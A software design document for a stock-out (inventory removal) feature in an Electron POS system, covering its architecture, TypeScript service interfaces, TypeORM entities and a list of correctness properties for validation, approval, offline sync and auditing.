# Design Document: Stock-Out Transaction Feature

## Overview

The Stock-Out Transaction feature provides a comprehensive system for recording, validating, approving, and processing inventory removals in a POS inventory management system. This feature addresses the critical need to maintain accurate inventory levels when products are lost, damaged, expired, stolen, or otherwise need to be removed from available stock.

### Key Capabilities

- **Transaction Creation**: Intuitive interface for creating single or batch stock-out transactions with reason codes and notes
- **Validation Engine**: Multi-layer validation ensuring data integrity and business rule compliance
- **Approval Workflow**: Configurable multi-level approval system based on transaction value and reason codes
- **Inventory Adjustment**: Atomic inventory updates with rollback capabilities and audit trails
- **Batch Processing**: Efficient handling of bulk removals via CSV import or barcode scanning
- **Audit & Compliance**: Immutable audit trails meeting regulatory requirements
- **Reporting & Analytics**: Comprehensive reporting on stock-out trends, patterns, and financial impact
- **Integration**: Real-time synchronization with POS systems via message bus and webhooks
- **Offline Support**: Local-first architecture enabling offline transaction creation with automatic sync

### Design Principles

1. **Data Integrity First**: All operations are validated and atomic with rollback capabilities
2. **Audit Trail Immutability**: Complete, tamper-evident records of all activities
3. **Local-First Architecture**: Offline capability with automatic synchronization
4. **Security by Default**: Role-based access control, input validation, and encryption
5. **Performance at Scale**: Support for high transaction volumes with caching and connection pooling
6. **Extensibility**: Plugin architecture for custom approval workflows and integrations

---

## Architecture

### System Context

The Stock-Out Transaction system operates within an Electron-based POS application using a local-first architecture with MSSQL backend synchronization.

```
┌─────────────────────────────────────────────────────────────────┐
│                        Renderer Process                          │
│  ┌──────────────────┐  ┌──────────────────┐  ┌───────────────┐ │
│  │ Stock-Out UI     │  │ Approval UI      │  │ Reports UI    │ │
│  │ Components       │  │ Components       │  │ Components    │ │
│  └────────┬─────────┘  └────────┬─────────┘  └───────┬───────┘ │
│           │                     │                     │          │
│  ┌────────▼─────────────────────▼─────────────────────▼───────┐ │
│  │              Redux Store (syncSlice, stockOutSlice)        │ │
│  └────────┬───────────────────────────────────────────────────┘ │
│           │ IPC Communication                                    │
└───────────┼──────────────────────────────────────────────────────┘
            │
┌───────────▼──────────────────────────────────────────────────────┐
│                         Main Process                              │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │                    IPC Handlers                           │   │
│  └────────┬─────────────────────────────────────────────────┘   │
│           │                                                       │
│  ┌────────▼─────────────────────────────────────────────────┐   │
│  │                  Service Layer                            │   │
│  │  ┌─────────────────┐  ┌──────────────────┐              │   │
│  │  │ StockOutService │  │ ApprovalService  │              │   │
│  │  └────────┬────────┘  └────────┬─────────┘              │   │
│  │  ┌────────▼────────┐  ┌────────▼─────────┐              │   │
│  │  │ ValidationSvc   │  │ InventoryAdjSvc  │              │   │
│  │  └─────────────────┘  └──────────────────┘              │   │
│  └────────┬─────────────────────────────────────────────────┘   │
│           │                                                       │
│  ┌────────▼─────────────────────────────────────────────────┐   │
│  │              TypeORM Repository Layer                     │   │
│  │  ┌──────────────┐  ┌──────────────┐  ┌───────────────┐  │   │
│  │  │ StockOut     │  │ StockOutItem │  │ SyncQueue     │  │   │
│  │  │ Repository   │  │ Repository   │  │ Repository    │  │   │
│  │  └──────────────┘  └──────────────┘  └───────────────┘  │   │
│  └────────┬─────────────────────────────────────────────────┘   │
│           │                                                       │
│  ┌────────▼─────────────────┐  ┌──────────────────────────┐    │
│  │   SQLite (Local)         │  │   Connectivity Service   │    │
│  │   - Offline writes       │  │   - Online/offline       │    │
│  │   - Sync queue           │  │   - Auto-reconnect       │    │
│  └──────────────────────────┘  └──────────────────────────┘    │
└───────────┬──────────────────────────────────────────────────────┘
            │ Sync on reconnect
┌───────────▼──────────────────────────────────────────────────────┐
│                      MSSQL Database                               │
│  ┌──────────────┐  ┌──────────────┐  ┌───────────────────────┐  │
│  │ StockOut     │  │ StockOutItem │  │ InventoryAdjustment   │  │
│  │ Table        │  │ Table        │  │ Table                 │  │
│  └──────────────┘  └──────────────┘  └───────────────────────┘  │
│  ┌──────────────┐  ┌──────────────┐                             │
│  │ AuditTrail   │  │ Inventory    │                             │
│  │ Table        │  │ Table        │                             │
│  └──────────────┘  └──────────────┘                             │
└───────────────────────────────────────────────────────────────────┘
```

### Architectural Layers

#### 1. Presentation Layer (Renderer Process)
- **React Components**: UI for transaction creation, approval, and reporting
- **Redux State Management**: Centralized state with slices for stock-out, sync, and connectivity
- **React Query**: Data fetching, caching, and synchronization
- **Form Management**: Formik + Yup for form validation

#### 2. IPC Communication Layer
- **Bidirectional IPC**: Secure communication between renderer and main process
- **Event Broadcasting**: Real-time updates for sync status and connectivity changes
- **Context Bridge**: Secure API exposure via preload scripts

#### 3. Service Layer (Main Process)
- **StockOutService**: Core business logic for transaction management
- **ValidationService**: Multi-layer validation engine
- **ApprovalService**: Workflow management and notification
- **InventoryAdjustmentService**: Atomic inventory updates
- **SyncEngineService**: Offline queue replay and conflict resolution
- **AuditService**: Immutable audit trail management
- **ReportService**: Analytics and report generation

#### 4. Data Access Layer
- **TypeORM Repositories**: Entity management and query building
- **Dual DataSource**: SQLite (local) + MSSQL (remote)
- **Transaction Management**: ACID compliance with rollback support
- **Connection Pooling**: Optimized database connections

#### 5. Integration Layer
- **Message Bus Publisher**: Event publishing for external systems
- **Webhook Service**: HTTP callbacks for integrations
- **CSV Parser**: Bulk import processing
- **API Gateway**: RESTful endpoints for external access

---

## Components and Interfaces

### Core Components

#### 1. StockOutService

**Responsibilities:**
- Create, read, update, delete stock-out transactions
- Coordinate validation, approval, and inventory adjustment
- Handle batch processing
- Manage transaction lifecycle

**Key Methods:**
```typescript
interface IStockOutService {
  // Transaction Management
  createTransaction(dto: CreateStockOutDto): Promise<StockOutTransaction>
  updateTransaction(id: string, dto: UpdateStockOutDto): Promise<StockOutTransaction>
  deleteTransaction(id: string): Promise<void>
  getTransaction(id: string): Promise<StockOutTransaction>
  listTransactions(filters: StockOutFilters): Promise<PaginatedResult<StockOutTransaction>>
  
  // Batch Operations
  createBatchTransaction(items: StockOutItemDto[]): Promise<BatchResult>
  importFromCSV(file: Buffer): Promise<ImportResult>
  
  // Workflow
  submitForApproval(id: string): Promise<void>
  cancelTransaction(id: string, reason: string): Promise<void>
}
```

**Dependencies:**
- ValidationService
- ApprovalService
- InventoryAdjustmentService
- AuditService
- ConnectivityService

#### 2. ValidationService

**Responsibilities:**
- Validate transaction data integrity
- Enforce business rules
- Check permissions
- Verify inventory availability

**Key Methods:**
```typescript
interface IValidationService {
  validateTransaction(dto: CreateStockOutDto): Promise<ValidationResult>
  validateItem(item: StockOutItemDto): Promise<ValidationResult>
  validateQuantity(itemId: string, quantity: number): Promise<ValidationResult>
  validateReasonCode(code: string): Promise<ValidationResult>
  validatePermissions(userId: string, operation: string): Promise<boolean>
  validateBatch(items: StockOutItemDto[]): Promise<BatchValidationResult>
}
```

**Validation Rules:**
- Quantity must be positive and within configurable limits
- Inventory item must exist and be active
- Reason code must be valid and active
- User must have required permissions
- Transaction value threshold checks

#### 3. ApprovalService

**Responsibilities:**
- Manage approval workflows
- Route approval requests
- Send notifications
- Track approval history

**Key Methods:**
```typescript
interface IApprovalService {
  requiresApproval(transaction: StockOutTransaction): Promise<boolean>
  getApprovers(transaction: StockOutTransaction): Promise<User[]>
  submitForApproval(transactionId: string): Promise<void>
  approve(transactionId: string, approverId: string, notes?: string): Promise<void>
  reject(transactionId: string, approverId: string, reason: string): Promise<void>
  getApprovalStatus(transactionId: string): Promise<ApprovalStatus>
}
```

**Approval Rules:**
- Value-based thresholds (configurable)
- Reason code-based requirements
- Multi-level approval chains
- Timeout and escalation policies

#### 4. InventoryAdjustmentService

**Responsibilities:**
- Execute atomic inventory updates
- Maintain transaction history
- Trigger alerts and notifications
- Recalculate inventory valuation

**Key Methods:**
```typescript
interface IInventoryAdjustmentService {
  adjustInventory(transaction: StockOutTransaction): Promise<AdjustmentResult>
  rollbackAdjustment(adjustmentId: string): Promise<void>
  validateAdjustment(transaction: StockOutTransaction): Promise<boolean>
  calculateImpact(transaction: StockOutTransaction): Promise<InventoryImpact>
}
```

**Adjustment Process:**
1. Begin database transaction
2. Lock inventory records
3. Validate current quantities
4. Apply adjustments
5. Update last-modified metadata
6. Recalculate valuation
7. Trigger low-stock alerts
8. Commit or rollback

#### 5. SyncEngineService

**Responsibilities:**
- Monitor connectivity status
- Queue offline operations
- Replay operations on reconnect
- Resolve conflicts

**Key Methods:**
```typescript
interface ISyncEngineService {
  enqueueOperation(operation: SyncOperation): Promise<void>
  syncPendingOperations(): Promise<SyncResult>
  getPendingCount(): Promise<number>
  resolveConflict(conflict: SyncConflict): Promise<void>
  getLastSyncTime(): Promise<Date | null>
}
```

**Sync Strategy:**
- Last-write-wins for V1
- Ordered replay by timestamp
- Exponential backoff on failures
- Conflict detection and logging

#### 6. AuditService

**Responsibilities:**
- Record all system activities
- Ensure immutability
- Support compliance reporting
- Enable forensic analysis

**Key Methods:**
```typescript
interface IAuditService {
  logActivity(activity: AuditActivity): Promise<void>
  getAuditTrail(entityId: string): Promise<AuditEntry[]>
  exportAuditLog(filters: AuditFilters): Promise<Buffer>
  verifyIntegrity(entryId: string): Promise<boolean>
}
```

**Audit Data:**
- User identity and session
- Timestamp (UTC)
- IP address
- Action type and details
- Before/after values
- Correlation IDs
- Failure reasons

#### 7. ReportService

**Responsibilities:**
- Generate stock-out reports
- Calculate analytics and trends
- Export to multiple formats
- Schedule automated reports

**Key Methods:**
```typescript
interface IReportService {
  generateSummaryReport(filters: ReportFilters): Promise<Report>
  calculateTrends(dateRange: DateRange): Promise<TrendData>
  identifyFrequentItems(threshold: number): Promise<ItemAnalysis[]>
  calculateFinancialImpact(filters: ReportFilters): Promise<FinancialReport>
  exportReport(reportId: string, format: ExportFormat): Promise<Buffer>
  scheduleReport(config: ReportSchedule): Promise<void>
}
```

#### 8. StockOutParser

**Responsibilities:**
- Parse CSV files for bulk import
- Validate file format and structure
- Handle encoding and special characters
- Provide detailed error reporting

**Key Methods:**
```typescript
interface IStockOutParser {
  parseCSV(file: Buffer, template: CSVTemplate): Promise<ParseResult>
  validateFormat(file: Buffer): Promise<FormatValidation>
  formatToCSV(transactions: StockOutTransaction[]): Promise<Buffer>
  getSupportedTemplates(): Promise<CSVTemplate[]>
}
```

### Data Flow Patterns

#### Transaction Creation Flow (Online)
```
User Input → Validation → Create Transaction → Submit for Approval
                                    ↓
                            Approval Required?
                                    ↓
                    Yes ← ─ ─ ─ ─ ─ ┴ ─ ─ ─ ─ ─ → No
                     ↓                              ↓
            Notify Approvers                 Adjust Inventory
                     ↓                              ↓
            Await Approval                   Update Audit Trail
                     ↓                              ↓
         Approved/Rejected                  Publish Events
                     ↓
            Adjust Inventory
                     ↓
            Update Audit Trail
                     ↓
            Publish Events
```

#### Transaction Creation Flow (Offline)
```
User Input → Validation → Create Transaction → Write to SQLite
                                    ↓
                            Enqueue to SyncQueue
                                    ↓
                            Update UI (Pending)
                                    ↓
                        [Wait for Connectivity]
                                    ↓
                            Connectivity Restored
                                    ↓
                            Replay from Queue
                                    ↓
                            Write to MSSQL
                                    ↓
                            Mark as Synced
                                    ↓
                            Update UI (Synced)
```

---

## Data Models

### Entity Relationship Diagram

```
┌─────────────────────────┐
│   StockOutTransaction   │
├─────────────────────────┤
│ id (PK)                 │
│ transactionNumber       │
│ status                  │
│ totalValue              │
│ createdBy               │
│ createdAt               │
│ submittedAt             │
│ approvedAt              │
│ approvedBy              │
│ notes                   │
│ syncStatus              │
└────────┬────────────────┘
         │ 1
         │
         │ has many
         │
         │ N
┌────────▼────────────────┐
│    StockOutItem         │
├─────────────────────────┤
│ id (PK)                 │
│ transactionId (FK)      │
│ inventoryItemId (FK)    │
│ quantity                │
│ reasonCodeId (FK)       │
│ unitCost                │
│ totalCost               │
│ notes                   │
│ lineNumber              │
└────────┬────────────────┘
         │
         │ references
         │
┌────────▼────────────────┐
│    InventoryItem        │
├─────────────────────────┤
│ id (PK)                 │
│ sku                     │
│ name                    │
│ availableQuantity       │
│ unitCost                │
│ reorderPoint            │
│ status                  │
│ lastModifiedAt          │
│ lastModifiedBy          │
└─────────────────────────┘

┌─────────────────────────┐
│      ReasonCode         │
├─────────────────────────┤
│ id (PK)                 │
│ code                    │
│ description             │
│ requiresApproval        │
│ isActive                │
└─────────────────────────┘

┌─────────────────────────┐
│   ApprovalWorkflow      │
├─────────────────────────┤
│ id (PK)                 │
│ transactionId (FK)      │
│ level                   │
│ approverId (FK)         │
│ status                  │
│ approvedAt              │
│ notes                   │
│ rejectionReason         │
└─────────────────────────┘

┌─────────────────────────┐
│  InventoryAdjustment    │
├─────────────────────────┤
│ id (PK)                 │
│ transactionId (FK)      │
│ inventoryItemId (FK)    │
│ quantityBefore          │
│ quantityAfter           │
│ adjustmentType          │
│ processedAt             │
│ processedBy             │
│ rollbackId              │
└─────────────────────────┘

┌─────────────────────────┐
│      AuditTrail         │
├─────────────────────────┤
│ id (PK)                 │
│ entityType              │
│ entityId                │
│ action                  │
│ userId                  │
│ timestamp               │
│ ipAddress               │
│ beforeValue             │
│ afterValue              │
│ correlationId           │
│ sessionId               │
└─────────────────────────┘

┌─────────────────────────┐
│      SyncQueue          │
├─────────────────────────┤
│ id (PK)                 │
│ tableName               │
│ operation               │
│ payload                 │
│ status                  │
│ retries                 │
│ createdAt               │
│ syncedAt                │
│ errorMessage            │
└─────────────────────────┘
```

### TypeORM Entity Definitions

#### StockOutTransaction Entity

```typescript
@Entity('stock_out_transactions')
export class StockOutTransaction extends BaseEntity {
  @PrimaryGeneratedColumn('uuid')
  id: string

  @Column({ unique: true })
  transactionNumber: string

  @Column({
    type: 'varchar',
    length: 50,
    default: 'draft'
  })
  status: 'draft' | 'pending_approval' | 'approved' | 'rejected' | 'completed' | 'cancelled'

  @Column({ type: 'decimal', precision: 15, scale: 2, default: 0 })
  totalValue: number

  @Column()
  createdBy: string

  @CreateDateColumn()
  createdAt: Date

  @Column({ nullable: true })
  submittedAt: Date

  @Column({ nullable: true })
  approvedAt: Date

  @Column({ nullable: true })
  approvedBy: string

  @Column({ type: 'text', nullable: true })
  notes: string

  @Column({
    type: 'varchar',
    length: 20,
    default: 'synced'
  })
  syncStatus: 'pending' | 'synced' | 'failed'

  @OneToMany(() => StockOutItem, item => item.transaction, { cascade: true })
  items: StockOutItem[]

  @OneToMany(() => ApprovalWorkflow, workflow => workflow.transaction)
  approvalWorkflows: ApprovalWorkflow[]

  @UpdateDateColumn()
  updatedAt: Date
}
```

#### StockOutItem Entity

```typescript
@Entity('stock_out_items')
export class StockOutItem extends BaseEntity {
  @PrimaryGeneratedColumn('uuid')
  id: string

  @Column()
  transactionId: string

  @ManyToOne(() => StockOutTransaction, transaction => transaction.items)
  @JoinColumn({ name: 'transactionId' })
  transaction: StockOutTransaction

  @Column()
  inventoryItemId: string

  @ManyToOne(() => InventoryItem)
  @JoinColumn({ name: 'inventoryItemId' })
  inventoryItem: InventoryItem

  @Column({ type: 'decimal', precision: 10, scale: 2 })
  quantity: number

  @Column()
  reasonCodeId: string

  @ManyToOne(() => ReasonCode)
  @JoinColumn({ name: 'reasonCodeId' })
  reasonCode: ReasonCode

  @Column({ type: 'decimal', precision: 15, scale: 2 })
  unitCost: number

  @Column({ type: 'decimal', precision: 15, scale: 2 })
  totalCost: number

  @Column({ type: 'text', nullable: true })
  notes: string

  @Column({ type: 'int' })
  lineNumber: number

  @CreateDateColumn()
  createdAt: Date
}
```

#### ReasonCode Entity

```typescript
@Entity('reason_codes')
export class ReasonCode extends BaseEntity {
  @PrimaryGeneratedColumn('uuid')
  id: string

  @Column({ unique: true, length: 50 })
  code: string

  @Column({ length: 255 })
  description: string

  @Column({ default: false })
  requiresApproval: boolean

  @Column({ default: true })
  isActive: boolean

  @CreateDateColumn()
  createdAt: Date

  @UpdateDateColumn()
  updatedAt: Date
}
```

#### ApprovalWorkflow Entity

```typescript
@Entity('approval_workflows')
export class ApprovalWorkflow extends BaseEntity {
  @PrimaryGeneratedColumn('uuid')
  id: string

  @Column()
  transactionId: string

  @ManyToOne(() => StockOutTransaction, transaction => transaction.approvalWorkflows)
  @JoinColumn({ name: 'transactionId' })
  transaction: StockOutTransaction

  @Column({ type: 'int' })
  level: number

  @Column()
  approverId: string

  @Column({
    type: 'varchar',
    length: 50,
    default: 'pending'
  })
  status: 'pending' | 'approved' | 'rejected'

  @Column({ nullable: true })
  approvedAt: Date

  @Column({ type: 'text', nullable: true })
  notes: string

  @Column({ type: 'text', nullable: true })
  rejectionReason: string

  @CreateDateColumn()
  createdAt: Date
}
```

#### InventoryAdjustment Entity

```typescript
@Entity('inventory_adjustments')
export class InventoryAdjustment extends BaseEntity {
  @PrimaryGeneratedColumn('uuid')
  id: string

  @Column()
  transactionId: string

  @Column()
  inventoryItemId: string

  @Column({ type: 'decimal', precision: 10, scale: 2 })
  quantityBefore: number

  @Column({ type: 'decimal', precision: 10, scale: 2 })
  quantityAfter: number

  @Column({ length: 50 })
  adjustmentType: string

  @Column()
  processedAt: Date

  @Column()
  processedBy: string

  @Column({ nullable: true })
  rollbackId: string

  @CreateDateColumn()
  createdAt: Date
}
```

#### AuditTrail Entity

```typescript
@Entity('audit_trail')
export class AuditTrail extends BaseEntity {
  @PrimaryGeneratedColumn('uuid')
  id: string

  @Column({ length: 100 })
  entityType: string

  @Column()
  entityId: string

  @Column({ length: 100 })
  action: string

  @Column()
  userId: string

  @Column()
  timestamp: Date

  @Column({ length: 45, nullable: true })
  ipAddress: string

  @Column({ type: 'text', nullable: true })
  beforeValue: string

  @Column({ type: 'text', nullable: true })
  afterValue: string

  @Column({ nullable: true })
  correlationId: string

  @Column({ nullable: true })
  sessionId: string

  @Index()
  @Column()
  createdAt: Date
}
```

#### SyncQueue Entity

```typescript
@Entity('sync_queue')
export class SyncQueue extends BaseEntity {
  @PrimaryGeneratedColumn()
  id: number

  @Column({ length: 100 })
  tableName: string

  @Column({ length: 20 })
  operation: 'CREATE' | 'UPDATE' | 'DELETE'

  @Column({ type: 'text' })
  payload: string

  @Column({ length: 20, default: 'pending' })
  status: 'pending' | 'synced' | 'failed'

  @Column({ type: 'int', default: 0 })
  retries: number

  @CreateDateColumn()
  createdAt: Date

  @Column({ nullable: true })
  syncedAt: Date

  @Column({ type: 'text', nullable: true })
  errorMessage: string
}
```

### Data Transfer Objects (DTOs)

#### CreateStockOutDto

```typescript
export interface CreateStockOutDto {
  items: StockOutItemDto[]
  notes?: string
}

export interface StockOutItemDto {
  inventoryItemId: string
  quantity: number
  reasonCodeId: string
  notes?: string
}
```

#### UpdateStockOutDto

```typescript
export interface UpdateStockOutDto {
  items?: StockOutItemDto[]
  notes?: string
  status?: string
}
```

#### StockOutFilters

```typescript
export interface StockOutFilters {
  status?: string[]
  createdBy?: string
  dateFrom?: Date
  dateTo?: Date
  reasonCodeId?: string
  minValue?: number
  maxValue?: number
  page?: number
  pageSize?: number
  sortBy?: string
  sortOrder?: 'ASC' | 'DESC'
}
```

### API Response Formats

#### Success Response

```typescript
export interface ApiResponse<T> {
  success: true
  data: T
  message?: string
  metadata?: {
    timestamp: string
    requestId: string
  }
}
```

#### Error Response

```typescript
export interface ApiErrorResponse {
  success: false
  error: {
    code: string
    message: string
    details?: any
  }
  metadata?: {
    timestamp: string
    requestId: string
  }
}
```

#### Paginated Response

```typescript
export interface PaginatedResult<T> {
  items: T[]
  pagination: {
    page: number
    pageSize: number
    totalItems: number
    totalPages: number
    hasNext: boolean
    hasPrevious: boolean
  }
}
```

---

## Correctness Properties

*A property is a characteristic or behavior that should hold true across all valid executions of a system—essentially, a formal statement about what the system should do. Properties serve as the bridge between human-readable specifications and machine-verifiable correctness guarantees.*

Before writing the correctness properties, I need to analyze the acceptance criteria to determine which are testable as properties.


### Property Reflection

After analyzing all 96 acceptance criteria, I identified the following redundancies and consolidation opportunities:

**Redundancy Group 1: Required Field Validation**
- Properties 1.2, 1.4, 1.5 all test that specific fields are required
- **Consolidation**: Combine into a single comprehensive property about required field validation

**Redundancy Group 2: Reference Validation**
- Properties 2.3, 2.4 both test that referenced entities must exist and be active
- **Consolidation**: Combine into a single property about reference integrity

**Redundancy Group 3: Automatic Field Population**
- Properties 1.8, 1.9 both test that fields are automatically populated
- **Consolidation**: Combine into a single property about automatic metadata capture

**Redundancy Group 4: Audit Trail Completeness**
- Properties 6.1, 6.2, 6.4, 6.7, 6.8 all test different aspects of audit record completeness
- **Consolidation**: Combine into comprehensive properties about audit trail completeness

**Redundancy Group 5: Batch Processing**
- Properties 3.3, 3.5, 3.6, 3.7 all relate to batch processing behavior
- **Consolidation**: Combine into properties about batch validation and partial success

**Redundancy Group 6: Approval Workflow**
- Properties 4.1, 4.2 both test configuration-driven approval requirements
- **Consolidation**: Combine into a single property about approval requirement determination

**Redundancy Group 7: Inventory Adjustment Metadata**
- Properties 5.3, 5.7 both test that metadata is updated during adjustments
- **Consolidation**: Combine into a single property about adjustment metadata

**Redundancy Group 8: Error Handling**
- Properties 8.1, 8.7 both relate to error information capture
- **Consolidation**: Combine into a single property about error logging

**Redundancy Group 9: Export Functionality**
- Properties 6.6, 7.5, 9.6 all test data export in various formats
- **Consolidation**: Combine into a single property about export format validity

After reflection, the 60+ identified properties can be consolidated into approximately 35 unique, non-redundant properties.

### Correctness Properties

#### Transaction Creation Properties

### Property 1: Unique Transaction Identifier

*For any* valid stock-out transaction creation request, the system SHALL generate and return a transaction with a unique identifier that never collides with existing transaction identifiers.

**Validates: Requirements 1.1**

### Property 2: Required Fields Validation

*For any* stock-out transaction, if any required field (items list, quantity per item, reason code per item) is missing or empty, the system SHALL reject the transaction and provide specific error messages indicating which fields are missing.

**Validates: Requirements 1.2, 1.4, 1.5, 2.6**

### Property 3: Automatic Metadata Capture

*For any* created stock-out transaction, the system SHALL automatically populate the transaction timestamp (createdAt) and creator identity (createdBy) fields with accurate values matching the current time and authenticated user.

**Validates: Requirements 1.8, 1.9**

### Property 4: Optional Fields Acceptance

*For any* stock-out transaction item, the system SHALL accept and store optional notes regardless of whether they are provided, empty, or contain any valid string content.

**Validates: Requirements 1.7**

### Property 5: Current Stock Display Accuracy

*For any* inventory item selected for stock-out, the displayed available stock quantity SHALL match the current quantity stored in the inventory database at the time of selection.

**Validates: Requirements 1.3**

### Property 6: Excess Quantity Warning

*For any* stock-out item where the requested quantity exceeds the available stock quantity, the system SHALL display a warning message and require explicit user confirmation before allowing the transaction to proceed.

**Validates: Requirements 1.6**

#### Validation Properties

### Property 7: Positive Quantity Validation

*For any* stock-out item quantity, the system SHALL reject any value that is not a positive number (including zero, negative numbers, and non-numeric values) and provide a validation error.

**Validates: Requirements 2.1**

### Property 8: Quantity Limit Validation

*For any* stock-out item quantity, if the value exceeds the configured maximum limit, the system SHALL reject the transaction and provide a validation error indicating the maximum allowed quantity.

**Validates: Requirements 2.2**

### Property 9: Reference Integrity Validation

*For any* stock-out transaction, all referenced entities (inventory items, reason codes) SHALL be validated to exist in the database and have an active status, and any reference to non-existent or inactive entities SHALL cause validation failure with specific error messages.

**Validates: Requirements 2.3, 2.4**

### Property 10: Duplicate Item Handling

*For any* stock-out transaction containing duplicate inventory items, the system SHALL either combine the quantities into a single line item or display a warning to the user, ensuring consistent handling across all transactions.

**Validates: Requirements 2.5**

### Property 11: Permission Validation

*For any* stock-out operation, if the authenticated user lacks the required permissions for the operation or the specific inventory items, the system SHALL reject the request and return an authorization error.

**Validates: Requirements 2.7, 10.2**

### Property 12: Value Threshold Approval Requirement

*For any* stock-out transaction, if the total transaction value exceeds the configured approval threshold OR the reason code requires approval, the system SHALL mark the transaction as requiring approval and prevent inventory adjustment until approval is granted.

**Validates: Requirements 2.8, 4.1, 4.2, 4.3**

#### Batch Processing Properties

### Property 13: Multi-Item Transaction Support

*For any* valid stock-out transaction containing multiple items (from 1 to thousands), the system SHALL accept and process all items as a single atomic transaction.

**Validates: Requirements 3.1**

### Property 14: Individual Item Validation in Batch

*For any* batch stock-out transaction, each item SHALL be validated independently, and validation errors SHALL be reported with specific item identifiers, allowing identification of which items failed validation.

**Validates: Requirements 3.3**

### Property 15: Batch Summary Accuracy

*For any* batch stock-out transaction, the displayed summary totals (total items count, total value) SHALL exactly match the sum of individual item quantities and costs.

**Validates: Requirements 3.4**

### Property 16: Partial Batch Success

*For any* batch stock-out transaction where some items fail validation, the system SHALL process all valid items successfully, log errors for failed items, and provide a detailed report showing which items succeeded and which failed with reasons.

**Validates: Requirements 3.5, 3.6, 3.7**

#### Approval Workflow Properties

### Property 17: Approval Workflow Creation

*For any* stock-out transaction requiring approval, the system SHALL create approval workflow records for all designated approvers at the appropriate approval levels based on transaction value and reason code configuration.

**Validates: Requirements 4.1, 4.2, 4.8**

### Property 18: Transaction Detail Access for Approvers

*For any* stock-out transaction in pending approval status, designated approvers SHALL be able to retrieve and view complete transaction details including all items, quantities, reason codes, and notes.

**Validates: Requirements 4.5**

### Property 19: Rejection Reason Requirement

*For any* approval rejection action, if the rejection reason is not provided or is empty, the system SHALL reject the rejection request and require a mandatory rejection reason.

**Validates: Requirements 4.6**

#### Inventory Adjustment Properties

### Property 20: Inventory Quantity Reduction

*For any* approved stock-out transaction, the inventory adjustment SHALL reduce the available stock quantity for each item by exactly the quantity specified in the transaction, with no more and no less.

**Validates: Requirements 5.1**

### Property 21: Atomic Inventory Updates

*For any* stock-out transaction affecting multiple inventory items, all inventory quantity updates SHALL be applied atomically such that either all updates succeed or all updates are rolled back, preventing partial updates.

**Validates: Requirements 5.2**

### Property 22: Adjustment History Recording

*For any* inventory adjustment, the system SHALL create an inventory adjustment history record containing the transaction ID, item ID, quantity before, quantity after, adjustment type, timestamp, and user identity.

**Validates: Requirements 5.3, 5.7**

### Property 23: Out-of-Stock Status Update

*For any* inventory item where a stock-out adjustment causes the available quantity to reach zero or below, the system SHALL automatically update the item status to indicate out-of-stock.

**Validates: Requirements 5.4**

### Property 24: Adjustment Rollback on Failure

*For any* inventory adjustment that fails during processing (due to database errors, validation failures, or system errors), the system SHALL rollback all changes to restore the previous inventory state and log the error with details.

**Validates: Requirements 5.6, 8.6**

### Property 25: Inventory Valuation Recalculation

*For any* inventory adjustment, the system SHALL recalculate the total inventory valuation by subtracting the cost of removed items (quantity × unit cost) from the previous valuation.

**Validates: Requirements 5.8**

#### Audit Trail Properties

### Property 26: Comprehensive Activity Logging

*For any* stock-out system activity (transaction creation, modification, approval, rejection, inventory adjustment), the system SHALL create an immutable audit trail record capturing the activity type, entity ID, user identity, timestamp, IP address, and action details.

**Validates: Requirements 6.1, 6.2**

### Property 27: Change Value Recording

*For any* modification or adjustment activity, the audit trail record SHALL include both the before-value and after-value of all changed fields in a structured format.

**Validates: Requirements 6.4**

### Property 28: Activity Correlation

*For any* set of related activities within a single transaction or workflow, all audit trail records SHALL share the same correlation ID, enabling reconstruction of the complete activity sequence.

**Validates: Requirements 6.7**

### Property 29: Failure Logging

*For any* failed transaction attempt or validation failure, the system SHALL create an audit trail record containing the failure reason, attempted action, and all relevant context information.

**Validates: Requirements 6.8**

#### Reporting Properties

### Property 30: Filtered Report Accuracy

*For any* stock-out report with specified filters (date range, reason code, user, value range), the report results SHALL include only transactions that match all specified filter criteria.

**Validates: Requirements 7.1**

### Property 31: Financial Impact Calculation

*For any* set of stock-out transactions, the calculated financial impact SHALL equal the sum of (quantity × unit cost) for all items across all transactions in the set.

**Validates: Requirements 7.4**

### Property 32: Frequent Item Identification

*For any* analysis period, items identified as having frequent stock-out occurrences SHALL be those with stock-out transaction counts exceeding the specified threshold, ordered by frequency.

**Validates: Requirements 7.3**

### Property 33: Dashboard Metric Accuracy

*For any* point in time, the real-time dashboard metrics (total transactions, total value, items affected) SHALL accurately reflect the current state of all stock-out transactions in the system.

**Validates: Requirements 7.6**

#### Error Handling and Recovery Properties

### Property 34: User-Friendly Error Messages

*For any* system error or validation failure, the error message presented to users SHALL not contain technical details (stack traces, database errors, internal codes) and SHALL provide actionable guidance in plain language.

**Validates: Requirements 8.1**

### Property 35: Exponential Backoff Retry

*For any* failed operation configured for automatic retry, the retry intervals SHALL follow an exponential backoff pattern (e.g., 1s, 2s, 4s, 8s) up to the maximum retry count.

**Validates: Requirements 8.2**

### Property 36: Offline Transaction Queueing

*For any* stock-out transaction created when database connectivity is unavailable, the transaction SHALL be written to the local SQLite database and added to the sync queue with pending status.

**Validates: Requirements 8.3**

### Property 37: Queued Transaction Validation

*For any* transaction in the sync queue being replayed after connectivity restoration, the system SHALL validate the current system state (inventory availability, item status, user permissions) before applying the transaction to the remote database.

**Validates: Requirements 8.4**

### Property 38: Concurrent Modification Detection

*For any* transaction or inventory item being modified concurrently by multiple users or processes, the system SHALL detect the conflict using optimistic locking or version checking and require user resolution before proceeding.

**Validates: Requirements 8.5**

### Property 39: Detailed Error Logging

*For any* error or exception, the system SHALL log complete error information including error type, error message, stack trace, user context, request parameters, and timestamp to facilitate troubleshooting.

**Validates: Requirements 8.7**

#### Integration and Synchronization Properties

### Property 40: Event Queue on Integration Failure

*For any* integration event (message bus publish, webhook call, external sync) that fails to deliver, the system SHALL add the event to a retry queue with the event payload, target system, and retry count.

**Validates: Requirements 9.4**

### Property 41: Data Consistency Validation

*For any* data synchronized between the stock-out system and external systems, the system SHALL validate that key fields (transaction ID, item IDs, quantities, values) match between systems and log any inconsistencies.

**Validates: Requirements 9.5**

### Property 42: Bulk Export Completeness

*For any* bulk data export request, the exported data SHALL include all records matching the export criteria with all required fields present and correctly formatted according to the specified export format.

**Validates: Requirements 9.6, 6.6, 7.5**

### Property 43: Idempotent Transaction Processing

*For any* stock-out transaction submitted multiple times with the same transaction identifier or idempotency key, the system SHALL process the transaction only once and return the same result for subsequent identical requests.

**Validates: Requirements 9.7**

#### Security Properties

### Property 44: Authentication Enforcement

*For any* stock-out system operation, if the request does not include valid authentication credentials or the session has expired, the system SHALL reject the request with an authentication error before processing any business logic.

